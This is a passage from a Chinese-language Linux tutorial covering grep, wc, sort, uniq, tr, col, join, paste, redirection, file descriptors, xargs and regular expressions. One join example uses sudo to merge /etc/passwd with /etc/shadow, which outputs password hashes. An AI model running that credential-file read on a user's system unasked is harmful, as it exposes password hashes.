class="hljs bash">grep -rnI <span class="hljs-string">&quot;shiyanlou&quot;</span> ~<br></code></pre></td></tr></table></figure><p><code>-r</code> 参数表示递归搜索子目录中的文件，<code>-n</code> 表示打印匹配项行号，<code>-I</code> 表示忽略二进制文件。这个操作实际没有多大意义，但可以感受到 <code>grep</code> 命令的强大与实用。</p><p>当然也可以在匹配字段中使用正则表达式，下面简单的演示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看环境变量中以 &quot;yanlou&quot; 结尾的字符串</span><br><span class="hljs-built_in">export</span> | grep <span class="hljs-string">&quot;.*yanlou$&quot;</span><br></code></pre></td></tr></table></figure><p>其中<code>$</code>表示一行的末尾</p><h3 id="wc-命令">wc 命令</h3><p>wc 命令用于统计并输出一个文件中行、单词和字节的数目，比如输出 <code>/etc/passwd</code> 文件的统计信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wc /etc/passwd<br></code></pre></td></tr></table></figure><p>分别只输出行数、单词数、字节数、字符数和输入文本中最长一行的字节数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 行数</span><br>wc -l /etc/passwd<br><span class="hljs-comment"># 单词数</span><br>wc -w /etc/passwd<br><span class="hljs-comment"># 字节数</span><br>wc -c /etc/passwd<br><span class="hljs-comment"># 字符数</span><br>wc -m /etc/passwd<br><span class="hljs-comment"># 最长行字节数</span><br>wc -L /etc/passwd<br></code></pre></td></tr></table></figure><p><strong>注意：对于西文字符来说，一个字符就是一个字节，但对于中文字符一个汉字是大于 2 个字节的，具体数目是由字符编码决定的。</strong></p><p>再来结合管道来操作一下，下面统计 /etc 下面所有目录数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ls -dl /etc/*/ | wc -l<br></code></pre></td></tr></table></figure><h3 id="sort-命令">sort 命令</h3><p>功能很简单就是将输入按照一定方式排序，然后再输出，它支持的排序有按字典排序，数字排序，按月份排序，随机排序，反转排序，指定特定字段进行排序等等。</p><p>默认为字典排序：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cat /etc/passwd | sort<br></code></pre></td></tr></table></figure><p>反转排序：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cat /etc/passwd | sort -r<br></code></pre></td></tr></table></figure><p>按特定字段排序：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cat /etc/passwd | sort -t<span class="hljs-string">&#x27;:&#x27;</span> -k 3<br></code></pre></td></tr></table></figure><p>上面的<code>-t</code>参数用于指定字段的分隔符，这里是以&quot;:&quot;作为分隔符；<code>-k 字段号</code>用于指定对哪一个字段进行排序。这里<code>/etc/passwd</code>文件的第三个字段为数字，默认情况下是以字典序排序的，如果要按照数字排序就要加上<code>-n</code>参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cat /etc/passwd | sort -t<span class="hljs-string">&#x27;:&#x27;</span> -k 3 -n<br></code></pre></td></tr></table></figure><p>注意观察第二个冒号后的数字：</p><p><img src="https://doc.shiyanlou.com/document-uid735639labid63timestamp1532414849333.png" alt=""></p><h3 id="uniq-命令">uniq 命令</h3><p><code>uniq</code> 命令可以用于过滤或者输出重复行。</p><ul><li>过滤重复行</li></ul><p>我们可以使用 <code>history</code> 命令查看最近执行过的命令（实际为读取 <code>$&#123;SHELL&#125;_history</code> 文件，如环境中的 <code>.zsh_history</code> 文件），不过你可能只想查看使用了哪个命令而不需要知道具体干了什么，那么你可能就会要想去掉命令后面的参数然后去掉重复的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">history</span> | cut -c 8- | cut -d <span class="hljs-string">&#x27; &#x27;</span> -f 1 | uniq<br></code></pre></td></tr></table></figure><p>然后经过层层过滤，你会发现确是只输出了执行的命令那一列，不过去重效果好像不明显，仔细看你会发现它确实去重了，只是不那么明显，之所以不明显是因为 <code>uniq</code> 命令只能去连续重复的行，不是全文去重，所以要达到预期效果，我们先排序：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">history</span> | cut -c 8- | cut -d <span class="hljs-string">&#x27; &#x27;</span> -f 1 | sort | uniq<br><span class="hljs-comment"># 或者</span><br><span class="hljs-built_in">history</span> | cut -c 8- | cut -d <span class="hljs-string">&#x27; &#x27;</span> -f 1 | sort -u<br></code></pre></td></tr></table></figure><p>这就是 Linux/UNIX 哲学吸引人的地方，大繁至简，一个命令只干一件事却能干到最好。</p><ul><li>输出重复行</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 输出重复过的行（重复的只输出一个）及重复次数</span><br><span class="hljs-built_in">history</span> | cut -c 8- | cut -d <span class="hljs-string">&#x27; &#x27;</span> -f 1 | sort | uniq -dc<br><span class="hljs-comment"># 输出所有重复的行</span><br><span class="hljs-built_in">history</span> | cut -c 8- | cut -d <span class="hljs-string">&#x27; &#x27;</span> -f 1 | sort | uniq -D<br></code></pre></td></tr></table></figure><p>文本处理命令还有很多，下一节将继续介绍一些常用的文本处理的命令。</p><h2 id="文本处理">文本处理</h2><h3 id="tr-命令">tr 命令</h3><p>tr 命令可以用来删除一段文本信息中的某些文字。或者将其进行转换。</p><h4 id="使用方式">使用方式</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tr [option]...SET1 [SET2]<br></code></pre></td></tr></table></figure><h4 id="常用的选项有">常用的选项有</h4><table><thead><tr><th>选项</th><th>说明</th></tr></thead><tbody><tr><td><code>-d</code></td><td>删除和 set1 匹配的字符，注意不是全词匹配也不是按字符顺序匹配</td></tr><tr><td><code>-s</code></td><td>去除 set1 指定的在输入文本中连续并重复的字符</td></tr></tbody></table><h4 id="操作举例">操作举例</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 删除 &quot;hello shiyanlou&quot; 中所有的&#x27;o&#x27;，&#x27;l&#x27;，&#x27;h&#x27;</span><br>$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;hello shiyanlou&#x27;</span> | tr -d <span class="hljs-string">&#x27;olh&#x27;</span><br><span class="hljs-comment"># 将&quot;hello&quot; 中的ll，去重为一个l</span><br>$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;hello&#x27;</span> | tr -s <span class="hljs-string">&#x27;l&#x27;</span><br><span class="hljs-comment"># 将输入文本，全部转换为大写或小写输出</span><br>$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;input some text here&#x27;</span> | tr <span class="hljs-string">&#x27;[:lower:]&#x27;</span> <span class="hljs-string">&#x27;[:upper:]&#x27;</span><br><span class="hljs-comment"># 上面的&#x27;[:lower:]&#x27; &#x27;[:upper:]&#x27;你也可以简单的写作&#x27;[a-z]&#x27; &#x27;[A-Z]&#x27;，当然反过来将大写变小写也是可以的</span><br></code></pre></td></tr></table></figure><p>与此同时<code>tr</code>命令也可以用于替换，比如需要把<code>$</code>替换为<code>^M</code>，则可以写：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tr <span class="hljs-string">&#x27;$&#x27;</span> <span class="hljs-string">&#x27;^M&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="col-命令">col 命令</h3><p>col 命令可以将<code>Tab</code>换成对等数量的空格键，或反转这个操作。</p><h4 id="使用方式-2">使用方式</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">col [option]<br></code></pre></td></tr></table></figure><h4 id="常用的选项有-2">常用的选项有</h4><table><thead><tr><th>选项</th><th>说明</th></tr></thead><tbody><tr><td><code>-x</code></td><td>将<code>Tab</code>转换为空格</td></tr><tr><td><code>-h</code></td><td>将空格转换为<code>Tab</code>（默认选项）</td></tr></tbody></table><h4 id="操作举例-2">操作举例</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看 /etc/protocols 中的不可见字符，可以看到很多 ^I ，这其实就是 Tab 转义成可见字符的符号</span><br>cat -A /etc/protocols<br><span class="hljs-comment"># 使用 col -x 将 /etc/protocols 中的 Tab 转换为空格，然后再使用 cat 查看，你发现 ^I 不见了</span><br>cat /etc/protocols | col -x | cat -A<br></code></pre></td></tr></table></figure><h3 id="join-命令">join 命令</h3><p>学过数据库的用户对这个应该不会陌生，这个命令就是用于将两个文件中包含相同内容的那一行合并在一起。</p><h4 id="使用方式-3">使用方式</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">join [option]... file1 file2<br></code></pre></td></tr></table></figure><h4 id="常用的选项有-3">常用的选项有</h4><table><thead><tr><th>选项</th><th>说明</th></tr></thead><tbody><tr><td><code>-t</code></td><td>指定分隔符，默认为空格</td></tr><tr><td><code>-i</code></td><td>忽略大小写的差异</td></tr><tr><td><code>-1</code></td><td>指明第一个文件要用哪个字段来对比，默认对比第一个字段</td></tr><tr><td><code>-2</code></td><td>指明第二个文件要用哪个字段来对比，默认对比第一个字段</td></tr></tbody></table><h4 id="操作举例-3">操作举例</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /home/shiyanlou<br><span class="hljs-comment"># 创建两个文件</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;1 hello&#x27;</span> &gt; file1<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;1 shiyanlou&#x27;</span> &gt; file2<br>join file1 file2<br><span class="hljs-comment"># 将 /etc/passwd 与 /etc/shadow 两个文件合并，指定以&#x27;:&#x27;作为分隔符</span><br>sudo join -t<span class="hljs-string">&#x27;:&#x27;</span> /etc/passwd /etc/shadow<br><span class="hljs-comment"># 将 /etc/passwd 与 /etc/group 两个文件合并，指定以&#x27;:&#x27;作为分隔符，分别比对第4和第3个字段</span><br>sudo join -t<span class="hljs-string">&#x27;:&#x27;</span> -1 4 /etc/passwd -2 3 /etc/group<br></code></pre></td></tr></table></figure><h3 id="paste-命令">paste 命令</h3><p><code>paste</code>这个命令与<code>join</code> 命令类似，它是在不对比数据的情况下，简单地将多个文件合并一起，以<code>Tab</code>隔开。</p><h4 id="使用方式-4">使用方式</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">paste [option] file...<br></code></pre></td></tr></table></figure><h4 id="常用的选项有-4">常用的选项有</h4><table><thead><tr><th>选项</th><th>说明</th></tr></thead><tbody><tr><td><code>-d</code></td><td>指定合并的分隔符，默认为 Tab</td></tr><tr><td><code>-s</code></td><td>不合并到一行，每个文件为一行</td></tr></tbody></table><h4 id="操作举例-4">操作举例</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> hello &gt; file1<br><span class="hljs-built_in">echo</span> shiyanlou &gt; file2<br><span class="hljs-built_in">echo</span> www.shiyanlou.com &gt; file3<br>paste -d <span class="hljs-string">&#x27;:&#x27;</span> file1 file2 file3<br>paste -s file1 file2 file3<br></code></pre></td></tr></table></figure><h2 id="数据流重定向">数据流重定向</h2><h3 id="简单重定向">简单重定向</h3><p>在更多了解 Linux 的重定向之前，我们需要先知道一些基本的东西，前面我们已经提到过 Linux 默认提供了三个特殊设备，用于终端的显示和输出，分别为 <code>stdin</code>（标准输入，对应于你在终端的输入），<code>stdout</code>（标准输出，对应于终端的输出），<code>stderr</code>（标准错误输出，对应于终端的输出）。</p><table><thead><tr><th>文件描述符</th><th>设备文件</th><th>说明</th></tr></thead><tbody><tr><td><code>0</code></td><td><code>/dev/stdin</code></td><td>标准输入</td></tr><tr><td><code>1</code></td><td><code>/dev/stdout</code></td><td>标准输出</td></tr><tr><td><code>2</code></td><td><code>/dev/stderr</code></td><td>标准错误</td></tr></tbody></table><blockquote><p>文件描述符：文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。在程序设计中，一些涉及底层的程序编写往往会围绕着文件描述符展开。但是文件描述符这一概念往往只适用于 UNIX、Linux 这样的操作系统。</p></blockquote><p>我们可以这样使用这些文件描述符。例如默认使用终端的标准输入作为命令的输入和标准输出作为命令的输出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cat <span class="hljs-comment"># 按 Ctrl+C 退出</span><br></code></pre></td></tr></table></figure><p>将 cat 的连续输出（heredoc 方式）重定向到一个文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">mkdir Documents<br>cat &gt; Documents/test.c &lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">#include &lt;stdio.h&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">int main()</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">    printf(&quot;hello world\n&quot;);</span><br><span class="hljs-string">    return 0;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">EOF</span><br></code></pre></td></tr></table></figure><p>将一个文件作为命令的输入，标准输出作为命令的输出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cat Documents/test.c<br></code></pre></td></tr></table></figure><p>将 echo 命令通过管道传过来的数据作为 cat 命令的输入，将标准输出作为命令的输出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;hi&#x27;</span> | cat<br></code></pre></td></tr></table></figure><p>将 echo 命令的输出从默认的标准输出重定向到一个普通文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;hello shiyanlou&#x27;</span> &gt; redirect<br>cat redirect<br></code></pre></td></tr></table></figure><p>初学者这里要注意不要将管道和重定向混淆，<strong>管道默认是连接前一个命令的输出到下一个命令的输入</strong>，而重定向通常是需要一个文件来建立两个命令的连接，你可以仔细体会一下上述第三个操作和最后两个操作的异同点。</p><h3 id="标准错误重定向">标准错误重定向</h3><p>重定向标准输出到文件，这是一个很实用的操作，另一个很实用的操作是将标准错误重定向，标准输出和标准错误都被指向伪终端的屏幕显示，所以我们经常看到的一个命令的输出通常是同时包含了标准输出和标准错误的结果的。比如下面的操作：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用cat 命令同时读取两个文件，其中一个存在，另一个不存在</span><br>cat Documents/test.c hello.c<br><span class="hljs-comment"># 你可以看到除了正确输出了前一个文件的内容，还在末尾出现了一条错误信息</span><br><span class="hljs-comment"># 下面我们将输出重定向到一个文件</span><br>cat Documents/test.c hello.c &gt; somefile<br></code></pre></td></tr></table></figure><p>遗憾的是，这里依然出现了那条错误信息，这正是因为如我上面说的那样，标准输出和标准错误虽然都指向终端屏幕，实际它们并不一样。那有的时候我们就是要隐藏某些错误或者警告，那又该怎么做呢。这就需要用到我们前面讲的文件描述符了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 将标准错误重定向到标准输出，再将标准输出重定向到文件，注意要将重定向到文件写到前面</span><br>cat Documents/test.c hello.c &gt;somefile  2&gt;&amp;1<br><span class="hljs-comment"># 或者只用bash提供的特殊的重定向符号&quot;&amp;&quot;将标准错误和标准输出同时重定向到文件</span><br>cat Documents/test.c hello.c &amp;&gt;somefilehell<br></code></pre></td></tr></table></figure><p><strong>注意你应该在输出重定向文件描述符前加上<code>&amp;</code>，否则 shell 会当做重定向到一个文件名为 1 的文件中</strong></p><h3 id="使用-tee-命令同时重定向到多个文件">使用 tee 命令同时重定向到多个文件</h3><p>除了需要将输出重定向到文件，也需要将信息打印在终端。那么你可以使用 <code>tee</code> 命令来实现：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;hello shiyanlou&#x27;</span> | tee hello<br></code></pre></td></tr></table></figure><h3 id="永久重定向">永久重定向</h3><p>你应该可以看出我们前面的重定向操作都只是临时性的，即只对当前命令有效，那如何做到永久有效呢，比如在一个脚本中，你需要某一部分的命令的输出全部进行重定向，难道要让你在每个命令上面加上临时重定向的操作嘛？</p><p>当然不需要，我们可以使用 <code>exec</code> 命令实现永久重定向。<code>exec</code> 命令的作用是使用指定的命令替换当前的 Shell，即使用一个进程替换当前进程，或者指定新的重定向：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 先开启一个子 Shell</span><br>zsh<br><span class="hljs-comment"># 使用exec替换当前进程的重定向，将标准输出重定向到一个文件</span><br><span class="hljs-built_in">exec</span> 1&gt;somefile<br><span class="hljs-comment"># 后面你执行的命令的输出都将被重定向到文件中，直到你退出当前子shell，或取消exec的重定向（后面将告诉你怎么做）</span><br>ls<br><span class="hljs-built_in">exit</span><br>cat somefile<br></code></pre></td></tr></table></figure><h3 id="创建输出文件描述符">创建输出文件描述符</h3><p>在 Shell 中有 9 个文件描述符。上面我们使用了也是它默认提供的 0，1，2 号文件描述符。另外我们还可以使用 3-8 的文件描述符，只是它们默认没有打开而已。你可以使用下面命令查看当前 Shell 进程中打开的文件描述符：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /dev/fd/;ls -Al<br></code></pre></td></tr></table></figure><p>同样使用 <code>exec</code> 命令可以创建新的文件描述符：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">zsh<br><span class="hljs-built_in">exec</span> 3&gt;somefile<br><span class="hljs-comment"># 先进入目录，再查看，否则你可能不能得到正确的结果，然后再回到上一次的目录</span><br><span class="hljs-built_in">cd</span> /dev/fd/;ls -Al;<span class="hljs-built_in">cd</span> -<br><span class="hljs-comment"># 注意下面的命令&gt;与&amp;之间不应该有空格，如果有空格则会出错</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;this is test&quot;</span> &gt;&amp;3<br>cat somefile<br><span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure><h3 id="关闭文件描述符">关闭文件描述符</h3><p>如上面我们打开的 3 号文件描述符，可以使用如下操作将它关闭：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> 3&gt;&amp;-<br><span class="hljs-built_in">cd</span> /dev/fd;ls -Al;<span class="hljs-built_in">cd</span> -<br></code></pre></td></tr></table></figure><h3 id="完全屏蔽命令的输出">完全屏蔽命令的输出</h3><p>在 Linux 中有一个被称为黑洞的设备文件，所有导入它的数据都将被吞噬。</p><blockquote><p>在类 UNIX 系统中，/dev/null，或称空设备，是一个特殊的设备文件，它通常被用于丢弃不需要的输出流，或作为用于输入流的空文件，这些操作通常由重定向完成。读取它则会立即得到一个 EOF。</p></blockquote><p>我们可以利用 <code>/dev/null</code> 屏蔽命令的输出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cat Documents/test.c 1&gt;/dev/null 2&gt;&amp;1<br></code></pre></td></tr></table></figure><p>上面这样的操作将使你得不到任何输出结果。</p><h3 id="使用-xargs-分割参数列表">使用 xargs 分割参数列表</h3><blockquote><p>xargs 是一条 UNIX 和类 UNIX 操作系统的常用命令。它的作用是将参数列表转换成小块分段传递给其他命令，以避免参数列表过长的问题。</p></blockquote><p>这个命令在有些时候十分有用，特别是当用来处理产生大量输出结果的命令如 <code>find</code>，<code>locate</code> 和 <code>grep</code> 的结果，详细用法请参看 man 文档。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cut -d: -f1 &lt; /etc/passwd | sort | xargs <span class="hljs-built_in">echo</span><br></code></pre></td></tr></table></figure><p>上面这个命令用于将 <code>/etc/passwd</code> 文件按 <code>:</code> 分割取第一个字段排序后，使用 <code>echo</code> 命令生成一个列表。</p><h2 id="正则表达式">正则表达式</h2><h3 id="基本语法">基本语法</h3><p>一个正则表达式通常被称为一个模式（<strong>pattern</strong>），为用来描述或者匹配一系列符合某个句法规则的字符串。</p><h4 id="选择">选择</h4><p><code>|</code> 竖直分隔符表示选择，例如 <code>boy|girl</code> 可以匹配 <code>boy</code> 或者 <code>girl</code>。</p><h4 id="数量限定">数量限定</h4><p>数量限定除了我们举例用的 <code>*</code> 还有 <code>+</code> 加号 <code>?</code> 问号，如果在一个模式中不加数量限定符则表示出现一次且仅出现一次：</p><ul><li><code>+</code> 表示前面的字符必须出现至少一次(1 次或多次)，例如 <code>goo+gle</code> 可以匹配 <code>gooogle</code>，<code>goooogle</code> 等；</li><li><code>?</code> 表示前面的字符最多出现一次（0 次或 1 次），例如，<code>colou?r</code>，可以匹配 <code>color</code> 或者 <code>colour</code>;</li><li><code>*</code> 星号代表前面的字符可以不出现，也可以出现一次或者多次（0 次、或 1 次、或多次），例如，<code>0*42</code> 可以匹配 42、042、0042、00042 等。</li></ul><h4 id="范围和优先级">范围和优先级</h4><p><code>()</code> 圆括号可以用来定义模式字符串的范围和优先级，这可以简单的理解为是否将括号内的模式串作为一个整体。例如，<code>gr(a|e)y</code> 等价于 <code>gray|grey</code>，（这里体现了优先级，竖直分隔符用于选择 <code>a</code> 或者 <code>e</code> 而不是 <code>gra</code> 和 <code>ey</code>），<code>(grand)?father</code> 匹配 <code>father</code> 和 <code>grandfather</code>（这里体现了范围，<code>?</code> 将圆括号内容作为一个整体匹配）。</p><h4 id="语法（部分）">语法（部分）</h4><p>正则表达式有多种不同的风格，下面列举一些常用的作为 PCRE 子集的适用于 <code>perl</code> 和 <code>python</code> 编程语言及 <code>grep</code> 或 <code>egrep</code> 的正则表达式匹配规则：</p><blockquote><p>PCRE（Perl Compatible Regular Expressions 中文含义：perl 语言兼容正则表达式）是一个用 C 语言编写的正则表达式函数库，由菲利普.海泽(Philip Hazel)编写。PCRE 是一个轻量级的函数库，比 Boost 之类的正则表达式库小得多。PCRE 十分易用，同时功能也很强大，性能超过了 POSIX 正则表达式库和一些经典的正则表达式库。</p></blockquote><p><strong>(由于 markdown 表格解析的问题，下面的竖直分隔符 <code>|</code> 用全角字符代替，实际使用时请换回半角字符。</strong></p><table><thead><tr><th>字符</th><th>描述</th></tr></thead><tbody><tr><td><code>\</code></td><td><strong>将下一个字符标记为一个特殊字符、或一个原义字符。</strong> 例如 <code>n</code> 匹配字符 <code>n</code>。<code>\n</code> 匹配一个换行符。序列 <code>\\</code> 匹配 <code>\</code> 而 <code>\(</code> 则匹配 <code>(</code>。</td></tr><tr><td><code>^</code></td><td><strong>匹配输入字符串的开始位置。</strong></td></tr><tr><td><code>$</code></td><td><strong>匹配输入字符串的结束位置。</strong></td></tr><tr><td><code>&#123;n&#125;</code></td><td>n 是一个非负整数。<strong>匹配确定的 n 次</strong>。例如 <code>o&#123;2&#125;</code> 不能匹配 <code>Bob</code> 中的 <code>o</code>，但是能匹配 <code>food</code> 中的两个 <code>o</code>。</td></tr><tr><td><code>&#123;n,&#125;</code></td><td>n 是一个非负整数。<strong>至少匹配 n 次</strong>。例如 <code>o&#123;2,&#125;</code> 不能匹配 <code>Bob</code> 中的 <code>o</code>，但能匹配 <code>foooood</code> 中的所有 <code>o</code>。<code>o&#123;1,&#125;</code> 等价于 <code>o+</code>。<code>o&#123;0,&#125;</code> 则等价于 <code>o*</code>。</td></tr><tr><td><code>&#123;n,m&#125;</code></td><td>m 和 n 均为非负整数，其中 <code>n&lt;=m</code>。<strong>最少匹配 n 次且最多匹配 m 次</strong>。例如，<code>o&#123;1,3&#125;</code> 将匹配 <code>fooooood</code> 中的前三个 <code>o</code>。<code>o&#123;0,1&#125;</code> 等价于 <code>o?</code>。请注意在逗号和两个数之间不能有空格。</td></tr><tr><td><code>*</code></td><td><strong>匹配前面的子表达式零次或多次</strong>。例如，<code>zo*</code> 能匹配 <code>z</code>、<code>zo</code> 以及 <code>zoo</code>。<code>*</code> 等价于 <code>&#123;0,&#125;</code>。</td></tr><tr><td><code>+</code></td><td><strong>匹配前面的子表达式一次或多次</strong>。例如，<code>zo+</code> 能匹配 <code>zo</code> 以及 <code>zoo</code>，但不能匹配 <code>z</code>。<code>+</code> 等价于 <code>&#123;1,&#125;</code>。</td></tr><tr><td><code>?</code></td><td><strong>匹配前面的子表达式零次或一次</strong>。例如，<code>do(es)?</code> 可以匹配 <code>do</code> 或 <code>does</code> 中的 <code>do</code>。<code>?</code> 等价于 <code>&#123;0,1&#125;</code>。</td></tr><tr><td><code>?</code></td><td>当该字符紧跟在任何一个其他限制符（<code>*</code>，<code>+</code>，<code>?</code>，<code>&#123;n&#125;</code>，<code>&#123;n,&#125;</code>，<code>&#123;n,m&#125;</code>）后面时，匹配模式是非贪婪的。非贪婪模式尽可能少的匹配所搜索的字符串，而默认的贪婪模式则尽可能多的匹配所搜索的字符串。例如，对于字符串 <code>oooo</code>，<code>o+?</code> 将匹配单个 <code>o</code>，而 <code>o+</code> 将匹配所有 <code>o</code>。</td></tr><tr><td><code>.</code></td><td><strong>匹配除 <code>\n</code> 之外的任何单个字符</strong>。要匹配包括 <code>\n</code> 在内的任何字符，请使用类似 <code>(.｜\n)</code> 的模式。</td></tr><tr><td><code>(pattern)</code></td><td><strong>匹配 pattern 并获取这一匹配的子字符串</strong>。该子字符串用于向后引用。要匹配圆括号字符，请使用 <code>\(</code> 和 <code>\)</code>。</td></tr><tr><td>x ｜ y</td><td><strong>匹配 x 或 y</strong>。例如，“z ｜ food”能匹配 <code>z</code> 或 <code>food</code>。“(z ｜ f)ood”则匹配 <code>zood</code> 或 <code>food</code>。</td></tr><tr><td><code>[xyz]</code></td><td>字符集合（character class）。<strong>匹配所包含的任意一个字符</strong>。例如，<code>[abc]</code> 可以匹配 <code>plain</code> 中的 <code>a</code>。其中特殊字符仅有反斜线 <code>\</code> 保持特殊含义，用于转义字符。其它特殊字符如星号、加号、各种括号等均作为普通字符。脱字符^如果出现在首位则表示负值字符集合；如果出现在字符串中间就仅作为普通字符。<strong>连字符 <code>-</code> 如果出现在字符串中间表示字符范围描述；如果出现在首位则仅作为普通字符。</strong></td></tr><tr><td><code>[^xyz]</code></td><td>排除型（negate）字符集合。**匹配未列出的任意字符。**例如，<code>[^abc]</code> 可以匹配 <code>plain</code> 中的 <code>plin</code>。</td></tr><tr><td><code>[a-z]</code></td><td>字符范围。**匹配指定范围内的任意字符。**例如，<code>[a-z]</code> 可以匹配 <code>a</code> 到 